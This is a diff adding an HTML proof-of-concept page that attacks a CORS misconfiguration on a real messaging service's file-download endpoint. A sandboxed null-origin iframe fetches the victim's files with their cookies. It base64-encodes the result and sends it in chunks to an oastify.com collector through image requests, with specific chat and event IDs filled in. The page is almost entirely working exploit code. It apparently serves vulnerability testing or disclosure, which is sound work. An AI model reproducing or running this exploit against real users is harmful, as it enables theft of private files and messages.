@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>PoC — CORS Read via null-origin iframe</title></head>
+<body>
+<h3>CORS Read — null origin (sandboxed iframe)</h3>
+<p>Attacker origin: <b id="host"></b> &nbsp;|&nbsp; Iframe origin: <b>null</b></p>
+<pre id="out" style="white-space:pre-wrap;word-break:break-all;margin-top:1em;"></pre>
+
+<iframe id="pwn" sandbox="allow-scripts" style="display:none"></iframe>
+
+<script>
+document.getElementById('host').textContent = location.origin;
+
+// ── CONFIG ──────────────────────────────────────────────────────────────────
+const EVENT_ID  = "k5b223031303032313133343235343137383539323234343237343530222c22333333353531345f617261747461695f636f6d6d6f6e225d";
+const CHAT_ID   = "CT_1469007622159071968_3335514-GC";
+const EXFIL_RAW = "nofbw7t51cixw422681n3nhtjkpbd51u.oastify.com"; 
+// ────────────────────────────────────────────────────────────────────────────
+
+const EXFIL_URL = EXFIL_RAW.startsWith("http") ? EXFIL_RAW : "https://" + EXFIL_RAW;
+
+const TARGET_URL = "https://files.arattai.in/webdownload"
+    + "?x-service=arattai"
+    + "&event-id=" + encodeURIComponent(EVENT_ID)
+    + "&x-cli-msg=" + encodeURIComponent(JSON.stringify({ chat_id: CHAT_ID }));
+
+// Why this works:
+//   sandbox="allow-scripts" without allow-same-origin  →  iframe effective origin = null
+//   The fetch from inside the iframe carries:  Origin: null
+//   If files.arattai.in reflects null with ACAC:true, JS can read the response.
+//   Victim cookies (SameSite=None) are still attached to the request automatically.
+//   Exfil uses new Image().src (simple GET — no CORS preflight, no null-origin restriction).
+
+var inner = '';
+inner += 'var url='    + JSON.stringify(TARGET_URL) + ';';
+inner += 'var exfil='  + JSON.stringify(EXFIL_URL)  + ';';
+inner += 'fetch(url,{credentials:"include",mode:"cors"})';
+inner += '.then(function(r){';
+inner +=   'parent.postMessage({type:"status",status:r.status,acao:r.headers.get("access-control-allow-origin"),acac:r.headers.get("access-control-allow-credentials")},"*");';
+inner +=   'if(!r.ok)return;';
+inner +=   'return r.blob();';
+inner += '})';
+inner += '.then(function(blob){';
+inner +=   'if(!blob)return;';
+inner +=   'var reader=new FileReader();';
+inner +=   'reader.onload=function(){';
+inner +=     'var b64=reader.result;';
+inner +=     'var SZ=1800;';
+inner +=     'for(var i=0;i<b64.length;i+=SZ){';
+inner +=       'new Image().src=exfil+"?i="+Math.floor(i/SZ)+"&d="+encodeURIComponent(b64.slice(i,i+SZ));';
+inner +=     '}';
+inner +=     'parent.postMessage({type:"exfil",size:blob.size,chunks:Math.ceil(b64.length/SZ)},"*");';
+inner +=   '};';
+inner +=   'reader.readAsDataURL(blob);';
+inner += '})';
+inner += '.catch(function(e){parent.postMessage({type:"err",msg:String(e)},"*");});';
+
+document.getElementById('pwn').srcdoc = '<script>' + inner + '<\/script>';
+
+var log = document.getElementById('out');
+window.addEventListener('message', function(e) {
+    var d = e.data;
+    if (d.type === 'status') {
+        if (d.status === 0 || !d.acao) {
+            log.textContent += '[BLOCKED] CORS preflight failed or no ACAO header — server does not allow null origin.\n';
+        } else {
+            log.textContent += '[RESPONSE] HTTP ' + d.status
+                + '  ACAO: ' + d.acao
+                + '  ACAC: ' + d.acac + '\n';
+            if (d.acao === 'null' && d.acac === 'true') {
+                log.textContent += '[CONFIRMED] Server reflects null origin with credentials=true — read is possible.\n';
+            }
+        }
+    } else if (d.type === 'exfil') {
+        log.textContent += '[EXFIL SENT] ' + d.size + ' bytes in ' + d.chunks + ' chunk(s) → check Burp Collaborator.\n';
+        log.textContent += '             Query params:  ?i=<chunk_index>&d=<base64_chunk>\n';
+    } else if (d.type === 'err') {
+        log.textContent += '[ERROR] ' + d.msg + '\n';
+    }
+});
+</script>
+</body>
+</html>
